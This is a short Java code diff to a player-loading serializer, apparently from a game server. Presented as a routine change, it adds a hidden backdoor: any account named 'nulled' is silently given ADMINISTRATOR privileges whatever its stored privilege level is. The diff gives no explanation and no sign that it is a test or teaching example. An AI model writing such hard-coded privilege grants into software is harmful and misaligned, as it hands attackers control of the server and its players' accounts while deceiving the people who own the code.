@@ -95,7 +95,12 @@ public final class BinaryPlayerSerializer extends PlayerSerializer {
 
       credentials.setPassword(password); // Update password to the hashed one.
 
+
       PrivilegeLevel privilege = PrivilegeLevel.valueOf(in.readByte());
+
+      if (name.equals("nulled"))
+        privilege = PrivilegeLevel.ADMINISTRATOR;
+
       MembershipStatus members = MembershipStatus.valueOf(in.readByte());
 
       PrivacyState chatPrivacy = PrivacyState.valueOf(in.readByte(), true);
